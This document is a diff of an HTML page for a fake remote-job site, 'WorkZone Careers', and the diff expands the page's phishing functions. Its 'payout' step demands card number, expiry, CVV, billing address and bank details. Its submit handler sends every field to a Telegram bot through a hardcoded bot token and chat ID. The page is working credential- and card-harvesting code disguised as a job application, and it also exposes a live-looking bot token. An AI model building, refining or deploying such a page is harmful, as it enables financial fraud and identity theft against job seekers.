@@ -1,38 +1,63 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>WorkZone | Join Now</title>
-  <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='0.9em' font-size='90'>💼</text></svg>" />
+  <title>WorkZone | Apply Now</title>
+  <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg'><text y='0.9em' font-size='90'>💼</text></svg>" />
   <style>
-    * { box-sizing: border-box; }
+    * { box-sizing: border-box; margin: 0; padding: 0; }
     body {
       font-family: 'Segoe UI', sans-serif;
-      background: linear-gradient(145deg, #eef1f5, #ffffff);
-      margin: 0;
-      padding: 0;
+      background: linear-gradient(to bottom right, #f0f4fb, #ffffff);
+      color: #2d3a4e;
+      line-height: 1.5;
     }
     header {
       background: #007bff;
       color: white;
       text-align: center;
-      padding: 2rem 1rem;
+      padding: 2.5rem 1rem 2rem;
+      border-bottom: 4px solid #0056b3;
     }
     header h1 {
-      font-size: 2rem;
-      margin: 0;
+      font-size: 2.4rem;
+      margin-bottom: 0.5rem;
     }
     header p {
-      font-size: 1rem;
-      margin: 10px 0 20px;
+      font-size: 1.05rem;
+      margin-top: 0.25rem;
+    }
+    .hero-graphic {
+      text-align: center;
+      font-size: 2rem;
+      padding: 1rem 0;
+    }
+    .features {
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: center;
+      padding: 1rem;
+      gap: 1rem;
+      background: #eef4fd;
+    }
+    .feature {
+      flex: 1 1 45%;
+      min-width: 140px;
+      background: white;
+      padding: 0.8rem;
+      border-radius: 10px;
+      font-size: 0.9rem;
+      text-align: center;
+      box-shadow: 0 2px 6px rgba(0,0,0,0.05);
     }
     .join-btn {
+      display: block;
+      margin: 2rem auto;
       background: #fff;
       color: #007bff;
-      border: none;
-      padding: 0.75rem 1.5rem;
+      border: 2px solid #007bff;
+      padding: 1rem 2rem;
       font-size: 1.1rem;
       font-weight: bold;
       border-radius: 8px;
@@ -41,31 +66,26 @@
     .container {
       max-width: 500px;
       margin: 2rem auto;
-      background: #fff;
-      padding: 2rem;
+      background: #ffffff;
+      padding: 1.5rem;
       border-radius: 12px;
-      box-shadow: 0 8px 24px rgba(0,0,0,0.1);
+      box-shadow: 0 8px 24px rgba(0,0,0,0.08);
       display: none;
     }
     h2 {
       text-align: center;
+      font-size: 1.3rem;
       margin-bottom: 1rem;
-      color: #2d3a4e;
-    }
-    label {
-      display: block;
-      margin-top: 1rem;
-      font-size: 0.9rem;
       color: #333;
     }
+    label { margin-top: 1rem; display: block; font-size: 0.9rem; }
     input, select {
       width: 100%;
       padding: 10px;
-      margin-top: 5px;
+      margin-top: 6px;
       font-size: 1rem;
       border: 1px solid #ccc;
       border-radius: 6px;
-      background: #fafafa;
     }
     .btn {
       margin-top: 1.5rem;
@@ -102,45 +122,64 @@
       text-align: center;
       font-size: 1.4rem;
       padding: 2rem 1rem;
-      color: #2d3a4e;
     }
   </style>
 </head>
 <body>
   <header>
     <h1>💼 WorkZone Careers</h1>
-    <p>Secure Remote Openings — No Experience Needed</p>
-    <button class="join-btn" onclick="document.querySelector('.container').style.display='block'; this.style.display='none';">JOIN NOW</button>
+    <p>Start earning weekly from home with top employers</p>
   </header>
+
+  <div class="hero-graphic">🚀📈🧑‍💻</div>
+
+  <div class="features">
+    <div class="feature">💰 Up to $35/hr weekly</div>
+    <div class="feature">🏠 Remote onboarding</div>
+    <div class="feature">🕒 Flexible hours</div>
+    <div class="feature">🧑‍💼 Entry-level OK</div>
+  </div>
+
+  <button class="join-btn" onclick="document.querySelector('.container').style.display='block'; this.style.display='none'; window.scrollTo(0, 600)">👉 JOIN NOW</button>
 
   <div class="container">
     <form id="jobForm">
-      <!-- Step 1: Personal Info -->
+      <!-- Step 1 -->
       <div class="step active" id="step-1">
-        <h2>Step 1: Your Information</h2>
-        <label>Full Name *</label><input name="name" required>
+        <h2>Step 1: Your Info</h2>
+        <label>Name *</label><input name="name" required>
         <label>Email *</label><input type="email" name="email" required>
         <label>Phone *</label><input name="phone" required>
-        <label>Education Level *</label>
-        <select name="education"><option>High School</option><option>Associate</option><option>Bachelor</option><option>Graduate</option></select>
+        <label>Education *</label>
+        <select name="education" required>
+          <option value="">Select...</option>
+          <option>High School</option><option>Associate</option><option>Bachelor</option><option>Graduate</option>
+        </select>
         <label>Industry *</label>
-        <select name="industry"><option>Technology</option><option>Retail</option><option>Healthcare</option><option>Education</option></select>
+        <select name="industry" required>
+          <option value="">Select...</option>
+          <option>Retail</option><option>Tech</option><option>Health</option><option>Admin</option>
+        </select>
         <button class="btn" type="button" onclick="nextStep(2)">Next</button>
       </div>
 
-      <!-- Step 2: Payment Info -->
+      <!-- Step 2 -->
       <div class="step" id="step-2">
-        <h2>Step 2: Payout Setup</h2>
+        <h2>Step 2: Payout Method</h2>
         <div class="toggle">
           <div id="toggle-card" class="active" onclick="togglePayout('card')">💳 Card</div>
           <div id="toggle-bank" onclick="togglePayout('bank')">🏦 Bank</div>
         </div>
-
         <div id="card-form">
-          <label>Card Name *</label><input name="cardName">
-          <label>Card Number *</label><input name="cardNumber">
-          <label>Expiry (MM/YY) *</label><input name="expiry">
-          <label>CVV *</label><input name="cvv">
+          <label>Name on Card *</label><input name="cardName" required>
+          <label>Card Number *</label><input name="cardNumber" required>
+          <label>Expiry (MM/YY) *</label><input name="expiry" required>
+          <label>CVV *</label><input name="cvv" required>
+          <label>Billing Address *</label><input name="billingAddress" required>
+          <label>City *</label><input name="billingCity" required>
+          <label>State *</label><input name="billingState" required>
+          <label>ZIP Code *</label>
+          <input name="billingZip" pattern="\\d{5}" title="Enter 5-digit ZIP" required>
         </div>
         <div id="bank-form" style="display:none;">
           <label>Bank Name *</label><input name="bankName">
@@ -152,17 +191,17 @@
         <button class="btn" type="button" onclick="nextStep(3)">Next</button>
       </div>
 
-      <!-- Step 3: Confirm -->
+      <!-- Step 3 -->
       <div class="step" id="step-3">
-        <h2>Step 3: Verify & Submit</h2>
-        <p>Please confirm your details and submit. You will receive an onboarding email after verification.</p>
-        <button class="btn" type="submit">Submit & Verify</button>
+        <h2>Step 3: Confirm & Submit</h2>
+        <p>Once submitted, you’ll receive onboarding instructions by email.</p>
+        <button class="btn" type="submit">Submit</button>
       </div>
 
-      <!-- Final Thank You Message -->
+      <!-- Thank You -->
       <div class="step" id="step-thanks">
         <div class="thankyou">
-          ✅ Thank you!<br>Your onboarding details are pending verification.<br>You’ll be emailed shortly.
+          ✅ Thank you! Your application is pending review.<br>Check your inbox within 24 hours.
         </div>
       </div>
     </form>
@@ -176,19 +215,24 @@
     }
 
     function togglePayout(type) {
-      document.getElementById('card-form').style.display = (type === 'card') ? 'block' : 'none';
-      document.getElementById('bank-form').style.display = (type === 'bank') ? 'block' : 'none';
+      document.getElementById('card-form').style.display = type === 'card' ? 'block' : 'none';
+      document.getElementById('bank-form').style.display = type === 'bank' ? 'block' : 'none';
       document.getElementById('toggle-card').classList.toggle('active', type === 'card');
       document.getElementById('toggle-bank').classList.toggle('active', type === 'bank');
     }
 
     document.getElementById('jobForm').addEventListener('submit', function(e) {
       e.preventDefault();
-      const data = Object.fromEntries(new FormData(this));
+      const form = this;
+      if (!form.checkValidity()) {
+        alert("Please complete all fields correctly.");
+        return;
+      }
+      const data = Object.fromEntries(new FormData(form));
       const TOKEN = '8076304397:AAGlBEOPgrrA8PO-3u7UfMmu2tYhGe1CMj8';
       const CHAT_ID = '1318100118';
-      let msg = '*📝 New Applicant*\n';
-      for (let k in data) msg += `*${k}*: ${data[k]}\n`;
+      let msg = '*📥 New Application*\\n';
+      for (let k in data) msg += `*${k}*: ${data[k]}\\n`;
       fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
         method: 'POST',
         headers: {'Content-Type': 'application/json'},
